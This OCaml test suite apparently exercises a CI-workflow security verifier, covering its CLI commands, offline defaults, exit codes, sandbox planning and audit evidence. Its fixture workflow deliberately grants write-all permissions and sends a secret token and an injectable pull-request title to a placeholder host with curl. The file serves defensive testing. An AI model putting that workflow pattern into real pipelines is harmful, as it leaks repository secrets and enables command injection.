type test = string * (unit -> unit)

exception Failed of string

let fail format = Printf.ksprintf (fun value -> raise (Failed value)) format
let expect message condition = if not condition then fail "%s" message

type harness = {
  mutable files : (string * string) list;
  mutable stdout : string list;
  mutable stderr : string list;
  mutable writes : int;
  mutable network_calls : int;
  mutable resolver_allowed_sources : string list list;
  mutable executions : int;
}

let vulnerable_workflow =
  "name: ci\n" ^ "on:\n  pull_request:\n" ^ "permissions: write-all\n"
  ^ "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
  ^ "      - uses: actions/checkout@v4\n"
  ^ "      - run: curl -d \"${{ secrets.TOKEN }}:${{ \
     github.event.pull_request.title }}\" https://example.invalid\n"

let harness () =
  {
    files = [ (".github/workflows/ci.yml", vulnerable_workflow) ];
    stdout = [];
    stderr = [];
    writes = 0;
    network_calls = 0;
    resolver_allowed_sources = [];
    executions = 0;
  }

let io state =
  {
    Cli.cwd = (fun () -> ".");
    read_file =
      (fun path ->
        match List.assoc_opt (Util.normalize_slashes path) state.files with
        | Some value -> Ok value
        | None -> Error ("missing " ^ path));
    write_file =
      (fun path contents ->
        state.writes <- state.writes + 1;
        state.files <-
          (Util.normalize_slashes path, contents)
          :: List.remove_assoc (Util.normalize_slashes path) state.files;
        Ok ());
    exists =
      (fun path ->
        List.mem_assoc (Util.normalize_slashes path) state.files || path = ".");
    is_directory =
      (fun path -> path = "." || path = "base" || path = "head" || path = "src");
    list_files =
      (fun root ->
        state.files |> List.map fst
        |> List.filter (fun path ->
            root = "." || Util.starts_with ~prefix:(root ^ "/") path));
    stdout = (fun text -> state.stdout <- text :: state.stdout);
    stderr = (fun text -> state.stderr <- text :: state.stderr);
  }

let services state =
  {
    Cli.resolver_network =
      Some
        (fun ~allowed_sources ->
          state.resolver_allowed_sources <-
            allowed_sources :: state.resolver_allowed_sources;
          {
            Resolver.fetch =
              (fun dependency ->
                let reference = dependency.Frontend_intf.reference in
                state.network_calls <- state.network_calls + 1;
                Ok
                  {
                    revision = String.make 40 'e';
                    content = "resolved " ^ reference;
                    source = "https://example.invalid/" ^ reference;
                    semantic_source = None;
                  });
          });
    sandbox_execute =
      Some
        (fun ~source_root:_ plan ->
          state.executions <- state.executions + 1;
          Ok
            {
              Sandbox_run.evidence =
                Evidence.empty ~plan_digest:plan.Sandbox_protocol.digest;
              outcome = Completed;
            });
    platform = "test";
    backend_probes = [];
  }

let output values = List.rev values |> String.concat ""

let help_surface_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "--help" |]
  in
  expect "help succeeds" (code = 0);
  let text = output state.stdout in
  List.iter
    (fun command ->
      expect ("help omits " ^ command) (Util.contains ~needle:command text))
    [
      "check";
      "resolve";
      "explain";
      "graph";
      "diff";
      "fix";
      "policy test";
      "sandbox plan";
      "sandbox run";
      "sandbox replay";
      "sandbox audit";
      "doctor";
    ]

let subcommand_help_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "check"; "--help" |]
  in
  expect "check help succeeds" (code = 0);
  expect "check help has its own usage"
    (Util.contains ~needle:"Usage: workflow-verifier check"
       (output state.stdout));
  expect "check help emits no diagnostics" (state.stderr = []);
  expect "check help is read-only" (state.writes = 0);
  expect "check help does not resolve" (state.network_calls = 0);
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "plan"; "--help" |]
  in
  expect "nested sandbox help succeeds" (code = 0);
  expect "nested sandbox help has its own usage"
    (Util.contains ~needle:"Usage: workflow-verifier sandbox plan"
       (output state.stdout));
  expect "nested sandbox help does not execute" (state.executions = 0)

let check_contract_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "check"; "--format"; "json"; "." |]
  in
  expect "gate exits 1 for high confidence findings" (code = 1);
  let report = output state.stdout in
  expect "check emits report-v1"
    (Util.contains ~needle:"\"schema\":\"report-v1\"" report);
  expect "check is read only" (state.writes = 0);
  expect "check is offline" (state.network_calls = 0);
  expect "check never executes workflow code" (state.executions = 0);
  let audit = harness () in
  let audit_code =
    Cli.run ~io:(io audit) ~services:(services audit)
      [| "workflow-verifier"; "check"; "--persona"; "audit"; "." |]
  in
  expect "audit reports without gating" (audit_code = 0)

let discovery_boundary_test () =
  let state = harness () in
  state.files <-
    ("_build/default/.github/workflows/copied.yml", vulnerable_workflow)
    :: ("helpers/target/debug/.github/workflows/copied.yml", vulnerable_workflow)
    :: ("test/fixtures/.github/workflows/intentional.yml", vulnerable_workflow)
    :: ("test/fixtures/.gitlab-ci.yml", "verify:\n  script: echo fixture\n")
    :: ("test/fixtures/azure-pipelines.yml", "trigger: [main]\npool: hosted\n")
    :: ("test/fixtures/.circleci/config.yml", "version: 2.1\nworkflows: {}\n")
    :: state.files;
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--persona";
        "audit";
        "--format";
        "json";
        ".";
      |]
  in
  expect "audit succeeds" (code = 0);
  expect "only root provider entrypoints are discovered as source inputs"
    (Util.contains ~needle:"\"inputs\":1" (output state.stdout));
  let filtered = harness () in
  filtered.files <-
    ( ".workflow-verifier.toml",
      "version = 1\n\
       persona = \"audit\"\n\
       frontends = [\"gitlab\"]\n\
       offline = true\n" )
    :: filtered.files;
  let filtered_code =
    Cli.run ~io:(io filtered) ~services:(services filtered)
      [| "workflow-verifier"; "check"; "." |]
  in
  expect "configured frontend selection is enforced" (filtered_code = 2)

let explicit_effects_test () =
  let offline = harness () in
  ignore
    (Cli.run ~io:(io offline) ~services:(services offline)
       [| "workflow-verifier"; "resolve"; "." |]);
  expect "resolve without network opt-in is offline" (offline.network_calls = 0);
  let online = harness () in
  online.files <-
    ( ".workflow-verifier.toml",
      "version = 1\n\
       persona = \"audit\"\n\
       frontends = [\"github\"]\n\
       offline = true\n\
       [resolver]\n\
       allowed_sources = [\"https://example.invalid/\"]\n" )
    :: online.files;
  ignore
    (Cli.run ~io:(io online) ~services:(services online)
       [| "workflow-verifier"; "resolve"; "--allow-network"; "." |]);
  expect "allow-network enables resolver adapter" (online.network_calls > 0);
  expect "resolver adapter receives the configured pre-fetch allowlist"
    (online.resolver_allowed_sources = [ [ "https://example.invalid/" ] ]);
  expect "resolve writes only its lockfile" (online.writes = 1);

  let dry = harness () in
  ignore
    (Cli.run ~io:(io dry) ~services:(services dry)
       [| "workflow-verifier"; "fix"; "." |]);
  expect "fix is dry-run by default" (dry.writes = 0);
  expect "fix dry-run emits a source diff"
    (Util.contains ~needle:"--- " (output dry.stdout)
    || Util.contains ~needle:"no behavior-preserving fixes" (output dry.stdout)
    );
  let pinned = harness () in
  let lock =
    Lockfile.make
      [
        {
          Lockfile.provider = Ir.Github;
          reference = "actions/checkout@v4";
          revision = String.make 40 'a';
          digest = "sha256:" ^ String.make 64 'b';
          source = "https://github.com/actions/checkout";
          summary = None;
        };
      ]
  in
  pinned.files <-
    ("workflow-verifier.lock", Lockfile.to_canonical_json lock) :: pinned.files;
  ignore
    (Cli.run ~io:(io pinned) ~services:(services pinned)
       [| "workflow-verifier"; "fix"; "." |]);
  expect "available fixes render a unified diff without writing"
    (pinned.writes = 0
    && Util.contains ~needle:"--- .github/workflows/ci.yml"
         (output pinned.stdout));

  let plan_only = harness () in
  ignore
    (Cli.run ~io:(io plan_only) ~services:(services plan_only)
       [| "workflow-verifier"; "sandbox"; "plan"; "." |]);
  expect "sandbox plan does not execute" (plan_only.executions = 0)

let strict_and_error_codes_test () =
  let strict = harness () in
  let code =
    Cli.run ~io:(io strict) ~services:(services strict)
      [| "workflow-verifier"; "check"; "--strict"; "--persona"; "audit"; "." |]
  in
  expect "strict incomplete has exit 3" (code = 3);
  let invalid = harness () in
  let invalid_code =
    Cli.run ~io:(io invalid) ~services:(services invalid)
      [| "workflow-verifier"; "unknown-command" |]
  in
  expect "bad command has exit 2" (invalid_code = 2);
  let no_executor = harness () in
  let no_services =
    { (services no_executor) with Cli.sandbox_execute = None }
  in
  let infrastructure =
    Cli.run ~io:(io no_executor) ~services:no_services
      [| "workflow-verifier"; "sandbox"; "run"; "." |]
  in
  expect "missing sandbox infrastructure has exit 5" (infrastructure = 5)

let explain_graph_doctor_test () =
  let explain = harness () in
  ignore
    (Cli.run ~io:(io explain) ~services:(services explain)
       [| "workflow-verifier"; "explain"; "WV-SEC-001"; "." |]);
  expect "explain contains trace and capability"
    (Util.contains ~needle:"trace"
       (String.lowercase_ascii (output explain.stdout))
    && Util.contains ~needle:"shell"
         (String.lowercase_ascii (output explain.stdout)));
  let graph_state = harness () in
  ignore
    (Cli.run ~io:(io graph_state) ~services:(services graph_state)
       [| "workflow-verifier"; "graph"; "--format"; "dot"; "." |]);
  expect "graph command emits DOT"
    (Util.starts_with ~prefix:"digraph workflow" (output graph_state.stdout));
  let doctor = harness () in
  let code =
    Cli.run ~io:(io doctor) ~services:(services doctor)
      [| "workflow-verifier"; "doctor"; "--format"; "json" |]
  in
  expect "doctor succeeds without side effects" (code = 0 && doctor.writes = 0);
  expect "doctor returns machine-readable controls"
    (Util.contains ~needle:"frontends" (output doctor.stdout))

let sandbox_replay_audit_test () =
  let state = harness () in
  let plan =
    match
      Sandbox_protocol.make_plan ~backend:(Oci "docker")
        ~source_digest:("sha256:" ^ String.make 64 '1')
        ~lock_digest:("sha256:" ^ String.make 64 '2')
        ~controls:[]
        ~limits:
          {
            cpu_seconds = 1;
            memory_mb = 64;
            processes = 2;
            output_bytes = 1024;
          }
        ~secret_names:[] ~dependencies:[] ~steps:[]
    with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  let evidence =
    Evidence.empty ~plan_digest:plan.digest
    |> Evidence.append
         (Evidence.Backend_attested
            {
              id = "oci:docker";
              version = "test";
              platform = "test";
              controls_digest = Sandbox_protocol.controls_digest plan.controls;
            })
  in
  state.files <-
    ("plan.json", Sandbox_protocol.to_canonical_json plan)
    :: ("evidence.json", Evidence.to_canonical_json evidence)
    :: state.files;
  let replay_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "replay"; "evidence.json" |]
  in
  expect "sandbox replay authenticates persisted evidence" (replay_code = 0);
  expect "sandbox replay emits canonical evidence"
    (Util.contains ~needle:"\"schema\":\"evidence-v1\"" (output state.stdout));
  state.stdout <- [];
  let audit_code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier"; "sandbox"; "audit"; "plan.json"; "evidence.json";
      |]
  in
  expect "sandbox audit verifies plan binding and controls" (audit_code = 0);
  expect "sandbox audit is machine readable"
    (Util.contains ~needle:"\"schema\":\"sandbox-audit-v1\""
       (output state.stdout))

let policy_fixture_test () =
  let state = harness () in
  state.files <-
    [
      ( ".workflow-verifier.toml",
        "version = 1\n\
         [[rules]]\n\
         id = \"ORG-NET\"\n\
         kind = \"forbid\"\n\
         selector.effect = \"network\"\n\
         message = \"network denied\"\n" );
      ( ".github/workflows/case.yml",
        "name: fixture\n\
         on: push\n\
         jobs:\n\
        \  check:\n\
        \    runs-on: ubuntu-latest\n\
        \    steps:\n\
        \      - run: curl https://example.invalid\n" );
      ( ".github/workflows/case.yml.expect.json",
        "{\"expected_rules\":[\"ORG-NET\"],\"schema\":\"policy-fixture-v1\"}\n"
      );
    ];
  let passing =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "policy"; "test"; "." |]
  in
  expect "policy fixtures execute the compiled workflow" (passing = 0);
  expect "policy fixture output reports the case"
    (Util.contains ~needle:"case.yml" (output state.stdout));
  state.stdout <- [];
  state.files <-
    ( ".github/workflows/case.yml.expect.json",
      "{\"expected_rules\":[],\"schema\":\"policy-fixture-v1\"}\n" )
    :: List.remove_assoc ".github/workflows/case.yml.expect.json" state.files;
  let failing =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "policy"; "test"; "." |]
  in
  expect "unexpected policy diagnostics fail the fixture gate" (failing = 1)

let incremental_cache_cli_test () =
  let state = harness () in
  let first =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--format";
        "json";
        "--cache";
        "analysis.cache";
        "--write-cache";
        ".";
      |]
  in
  expect "cache write retains the finding exit code" (first = 1);
  expect "cache is written only by explicit opt-in" (state.writes = 1);
  expect "cache envelope is content addressed"
    (match List.assoc_opt "analysis.cache" state.files with
    | Some source -> Util.contains ~needle:"analysis-cache-v1" source
    | None -> false);
  let first_output = output state.stdout in
  state.stdout <- [];
  state.writes <- 0;
  let warm =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--format";
        "json";
        "--cache";
        "analysis.cache";
        ".";
      |]
  in
  expect "warm cache reproduces report and exit status"
    (warm = first && output state.stdout = first_output);
  expect "warm cache is read-only" (state.writes = 0)

let sandbox_source_manifest_test () =
  let plan_digest files =
    let state = harness () in
    state.files <- files @ state.files;
    let code =
      Cli.run ~io:(io state) ~services:(services state)
        [| "workflow-verifier"; "sandbox"; "plan"; "." |]
    in
    expect "sandbox plan succeeds" (code = 0);
    match Sandbox_protocol.parse (output state.stdout) with
    | Ok plan -> plan.source_digest
    | Error message -> fail "sandbox plan is not parseable: %s" message
  in
  let first = plan_digest [ ("README.md", "first\n") ] in
  let changed = plan_digest [ ("README.md", "second\n") ] in
  let ignored =
    plan_digest
      [
        ("README.md", "first\n"); ("_build/default/generated.txt", "volatile\n");
      ]
  in
  expect "every mounted source file contributes to the source digest"
    (first <> changed);
  expect "generated trees are excluded from the mounted source manifest"
    (first = ignored)

let sandbox_reconciliation_cli_test () =
  let state = harness () in
  state.files <-
    [
      ( "src/.github/workflows/ci.yml",
        "name: reconcile\n\
         on: push\n\
         jobs:\n\
        \  build:\n\
        \    runs-on: ubuntu-latest\n\
        \    steps:\n\
        \      - run: echo ok\n" );
      ( "src/.workflow-verifier.toml",
        "version = 1\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"oci:docker\"\n\
         image = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let plan_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "plan"; "src" |]
  in
  expect "reconciliation fixture plan succeeds" (plan_code = 0);
  let plan_source = output state.stdout in
  let plan =
    match Sandbox_protocol.parse plan_source with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  let evidence =
    Evidence.empty ~plan_digest:plan.digest
    |> Evidence.append
         (Evidence.Backend_attested
            {
              id = "oci:docker";
              version = "test";
              platform = "test";
              controls_digest = Sandbox_protocol.controls_digest plan.controls;
            })
    |> fun initial ->
    List.fold_left
      (fun current control ->
        Evidence.append
          (Evidence.Control_attested (Sandbox_protocol.control_name control))
          current)
      initial plan.controls
    |> Evidence.append
         (Evidence.Process_started { executable = "docker"; argv = [] })
    |> Evidence.append (Evidence.Process_exited { code = 0 })
  in
  state.files <-
    ("plan.json", plan_source)
    :: ("evidence.json", Evidence.to_canonical_json evidence)
    :: state.files;
  state.stdout <- [];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "sandbox";
        "audit";
        "plan.json";
        "evidence.json";
        "src";
      |]
  in
  expect "static/runtime reconciliation verifies a predicted effect" (code = 0);
  expect "audit serializes the reconciliation property"
    (Util.contains ~needle:"\"id\":\"WV-RUNTIME-001\"" (output state.stdout)
    && Util.contains ~needle:"\"state\":\"Proved\"" (output state.stdout))

let macos_vm_control_contract_test () =
  let state = harness () in
  state.files <-
    [
      ( "src/.github/workflows/ci.yml",
        "name: vm\n\
         on: push\n\
         jobs:\n\
        \  build:\n\
        \    runs-on: macos-latest\n\
        \    steps:\n\
        \      - run: echo isolated\n" );
      ( "src/.workflow-verifier.toml",
        "version = 1\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"macos-vm\"\n\
         image = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "plan"; "src" |]
  in
  expect "macOS VM plan succeeds" (code = 0);
  let plan = output state.stdout in
  expect "macOS VM requires the VM boundary"
    (Util.contains ~needle:"virtual_machine" plan);
  expect "macOS VM does not require an unrelated App Sandbox boundary"
    (not (Util.contains ~needle:"app_sandbox" plan))

let file_target_lock_path_contract_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "resolve";
        "--allow-network";
        ".github/workflows/ci.yml";
      |]
  in
  expect "file-target resolution succeeds" (code = 0);
  expect "the default lockfile is adjacent to the target file"
    (List.mem_assoc ".github/workflows/workflow-verifier.lock" state.files);
  expect "the workflow file is never treated as a directory"
    (not
       (List.mem_assoc ".github/workflows/ci.yml/workflow-verifier.lock"
          state.files))

let local_workspace_linking_cli_test () =
  let state = harness () in
  let workflow =
    "name: local\n\
     on: push\n\
     jobs:\n\
    \  build:\n\
    \    runs-on: ubuntu-latest\n\
    \    steps:\n\
    \      - uses: ./actions/build\n"
  and action =
    "name: build\nruns:\n  using: composite\n  steps:\n    - run: echo linked\n"
  and unused =
    "name: unused\n\
     runs:\n\
    \  using: composite\n\
    \  steps:\n\
    \    - run: echo unused\n"
  in
  state.files <-
    [
      (".github/workflows/ci.yml", workflow);
      ("actions/build/action.yml", action);
      ("actions/unused/action.yml", unused);
      ( ".workflow-verifier.toml",
        "version = 1\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"oci:docker\"\n\
         image = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--strict";
        "--persona";
        "audit";
        "--format";
        "json";
        ".";
      |]
  in
  expect "an exact local action discharges strict incompleteness" (code = 0);
  expect
    "only entrypoints and their transitive local units become report inputs"
    (Util.contains ~needle:"\"inputs\":2" (output state.stdout));
  state.stdout <- [];
  let plan_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "plan"; "." |]
  in
  expect "a content-addressed local action yields a complete sandbox plan"
    (plan_code = 0);
  let plan =
    match Sandbox_protocol.parse (output state.stdout) with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  expect "sandbox consumes local dependency evidence without a lockfile entry"
    (match plan.dependencies with
    | [ dependency ] ->
        dependency.reference = "./actions/build"
        && dependency.available
        && dependency.digest = Some ("sha256:" ^ Sha256.digest_string action)
    | _ -> false);
  expect "the linked composite action contributes its executable command"
    (match plan.status with
    | Sandbox_protocol.Complete ->
        List.exists
          (fun (step : Sandbox_protocol.step) ->
            step.supported
            && step.argv
               = [ "/bin/bash"; "-euo"; "pipefail"; "-c"; "echo linked" ])
          plan.steps
    | Incomplete _ -> false)

let tests : test list =
  [
    ("help exposes the complete stable command surface", help_surface_test);
    ("subcommand help is specific and side-effect free", subcommand_help_test);
    ("check obeys gate report and read-only defaults", check_contract_test);
    ("discovery excludes generated trees", discovery_boundary_test);
    ( "network write and execution require separate opt-ins",
      explicit_effects_test );
    ( "exit codes distinguish input incomplete and infrastructure",
      strict_and_error_codes_test );
    ("explain graph and doctor expose evidence", explain_graph_doctor_test);
    ( "sandbox replay and audit authenticate persisted evidence",
      sandbox_replay_audit_test );
    ("policy test executes expectation fixtures", policy_fixture_test);
    ("check uses an opt-in content-addressed cache", incremental_cache_cli_test);
    ( "sandbox plan hashes the complete mounted source tree",
      sandbox_source_manifest_test );
    ( "sandbox audit reconciles static and runtime effects",
      sandbox_reconciliation_cli_test );
    ( "macOS VM requests exactly the controls it attests",
      macos_vm_control_contract_test );
    ( "file targets place the default lock beside the source",
      file_target_lock_path_contract_test );
    ( "CLI recursively links local workspace units",
      local_workspace_linking_cli_test );
  ]

let () =
  let failures = ref 0 in
  List.iter
    (fun (name, run) ->
      try
        run ();
        Printf.printf "ok - %s\n%!" name
      with
      | Failed message ->
          incr failures;
          Printf.eprintf "not ok - %s: %s\n%!" name message
      | error ->
          incr failures;
          Printf.eprintf "not ok - %s: unexpected %s\n%!" name
            (Printexc.to_string error))
    tests;
  if !failures > 0 then exit 1
